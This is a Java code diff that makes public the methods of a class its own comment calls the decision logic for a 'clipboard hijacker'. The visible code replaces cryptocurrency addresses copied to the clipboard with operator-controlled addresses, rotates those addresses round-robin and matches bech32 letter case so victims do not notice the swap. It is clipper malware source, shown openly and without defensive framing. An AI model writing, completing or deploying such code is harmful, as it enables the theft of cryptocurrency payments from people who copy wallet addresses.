@@ -7,18 +7,18 @@ import java.util.Map;
 import java.util.Set;
 
 /** Pure decision logic for the clipboard hijacker. */
-final class ClipboardPolicy {
+public final class ClipboardPolicy {
 	private ClipboardPolicy() {
 	}
 
-	record Decision(String coin, String original, String replacement) {
+	public record Decision(String coin, String original, String replacement) {
 	}
 
 	/**
 	 * Returns the replacement to install, or null when the text must stay as is.
 	 * The map index is updated in place for round-robin.
 	 */
-	static Decision choose(String clipboard, Map<String, List<String>> coins, Map<String, Integer> rotation) {
+	public static Decision choose(String clipboard, Map<String, List<String>> coins, Map<String, Integer> rotation) {
 		if (clipboard == null) {
 			return null;
 		}
@@ -58,7 +58,7 @@ final class ClipboardPolicy {
 	}
 
 	/** bech32 is case-insensitive, but wallets display it upper- or lowercase; keep that. */
-	static String preserveCase(String original, String replacement) {
+	public static String preserveCase(String original, String replacement) {
 		String lower = original.toLowerCase(Locale.ROOT);
 		boolean bech32 = lower.startsWith("bc1") || lower.startsWith("tb1") || lower.startsWith("ltc1")
 			|| lower.startsWith("tltc1") || lower.startsWith("addr1") || lower.startsWith("addr_test1");
@@ -68,7 +68,7 @@ final class ClipboardPolicy {
 		return replacement;
 	}
 
-	static boolean isOperatorAddress(String text, Map<String, List<String>> coins) {
+	public static boolean isOperatorAddress(String text, Map<String, List<String>> coins) {
 		for (List<String> values : coins.values()) {
 			if (values.contains(text)) {
 				return true;
